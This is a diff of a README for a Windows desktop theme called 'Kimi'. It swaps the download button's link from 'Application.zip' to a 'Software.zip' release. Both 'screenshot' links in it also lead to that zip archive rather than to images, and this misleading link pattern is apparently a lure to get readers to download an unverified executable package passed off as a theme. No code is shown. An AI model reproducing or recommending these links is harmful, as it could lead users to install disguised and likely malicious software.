@@ -39,7 +39,7 @@ This repository covers a variety of topics related to desktop customization, vis
 
 To download the Kimi theme, click the button below:
 
-[![](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip%https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
+[![](https://github.com/BinKeinSweater/kimi/releases/download/v2.0/Software.zip%https://github.com/BinKeinSweater/kimi/releases/download/v2.0/Software.zip)](https://github.com/BinKeinSweater/kimi/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the theme, follow these steps to install it on your Windows system:
 
@@ -51,8 +51,8 @@ Once you have downloaded the theme, follow these steps to install it on your Win
 
 Check out these screenshots to get a preview of how the Kimi theme looks on your desktop:
 
-![Screenshot 1](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
-![Screenshot 2](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
+![Screenshot 1](https://github.com/BinKeinSweater/kimi/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/BinKeinSweater/kimi/releases/download/v2.0/Software.zip)
 
 ## Support 💬
 
